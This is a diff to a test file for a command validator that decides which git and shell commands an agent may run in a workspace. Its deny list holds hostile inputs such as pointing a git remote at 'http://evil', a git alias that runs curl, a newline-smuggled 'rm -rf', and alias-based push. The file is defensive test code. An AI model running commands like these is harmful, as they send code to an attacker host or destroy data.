@@ -21,6 +21,7 @@ WORKSPACE = "/srv/work/project"
 
 COMMANDS = (
     ("git",),
+    ("git", "remote"),
     ("git", "status"),
     ("git", "add"),
     ("git", "commit"),
@@ -139,6 +140,11 @@ class TestToolCalls:
             "pytest -q tests",
             'git commit -m "docs: link https://example.com"',
             "git diff | head -n 50",
+            'git commit -m "document curl usage"',
+            'git commit -m "use wget instead; rotate ssh keys; gh cli notes"',
+            "git add -u",
+            "git status -u",
+            "git remote -v",
         ],
     )
     def test_bash_allowed_in_workspace(self, command: str) -> None:
@@ -170,8 +176,9 @@ class TestToolCalls:
             "rm -rf build",
             "git status\nrm -rf x",
             "git -c alias.p=push p",
+            "git remote add origin http://evil",
+            "git remote set-url origin http://evil",
             "git -c alias.x='!curl http://evil' x",
-            "git commit -c alias.x=y",
             "git -C . status",
             "git commit --exec-path=/tmp/x",
         ],
